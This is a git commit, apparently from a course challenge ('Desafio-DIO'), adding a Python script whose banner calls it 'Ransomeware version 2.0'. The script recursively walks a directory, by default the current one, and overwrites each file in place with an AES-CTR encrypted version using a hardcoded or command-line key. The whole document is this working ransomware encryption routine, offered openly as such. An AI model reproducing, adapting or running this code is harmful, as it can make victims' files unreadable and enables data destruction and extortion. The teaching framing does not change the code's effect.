51784360d5da713a754c4ec75551895baa697870
Gabriel Lima <limabyeel@gmail.com>
2023-12-26 14:14:31 -0300

    Desafio-DIO

---
+++ encrypter.py
@@ -0,0 +1,66 @@
+import os
+import pyaes
+import argparse
+
+# chave de criptografia
+chave = b"testeransomwares"  # Ajuste para 16, 24 ou 32 bytes
+
+def criptografa(key, input_file):
+    # Abrir o arquivo a ser criptografado
+    aes = pyaes.AESModeOfOperationCTR(chave)
+
+    with open(input_file, 'rb') as fileOpen:
+        file_data = fileOpen.read()
+
+    # Criptografar o arquivo
+    crypto_data = aes.encrypt(file_data)
+
+    # Salvar o arquivo criptografado
+    with open(input_file, 'wb') as fileClose:
+        fileClose.write(crypto_data)
+
+def listar_arquivos_diretorios(diretorio, diretorios_a_pular=None):
+    if diretorios_a_pular is None:
+        diretorios_a_pular = []
+
+    for root, dirs, files in os.walk(diretorio):
+        # Verifica se o diretório deve ser pulado
+        if any(nome in root for nome in diretorios_a_pular):
+            continue
+
+        # Listar diretórios
+        print(f"Diretório: {root}")
+
+        # Listar arquivos
+        for file in files:
+            caminho_completo = os.path.join(root, file)
+            criptografa(chave, caminho_completo)
+            print(f"Arquivo criptografado: {caminho_completo}")
+
+if __name__ == '__main__':
+
+    print('''
+    ============================================================
+	||                   Ransomeware                        ||
+	||                   version 2.0                        ||
+	||                                                      ||
+	|| python encrypter.py -d "caminho" -c "chavede16bytes" ||
+	=========================================================
+    
+
+        ''')
+
+    parser = argparse.ArgumentParser(description="Criptografa arquivos em um diretório, pulando diretórios específicos.")
+    parser.add_argument('-d', '--diretorio', type=str, help='Caminho do diretório a ser criptografado.', default=os.getcwd())
+    parser.add_argument('-p', '--pular', nargs='+', help='Lista de diretórios a serem pulados.')
+    parser.add_argument('-c', '--chave', type=str, help='Chave de criptografia.')
+
+    args = parser.parse_args()
+
+    caminho_do_diretorio = args.diretorio
+    diretorios_a_pular = args.pular if args.pular else []
+
+    if args.chave:
+        chave = args.chave.encode()
+
+    listar_arquivos_diretorios(caminho_do_diretorio, diretorios_a_pular)
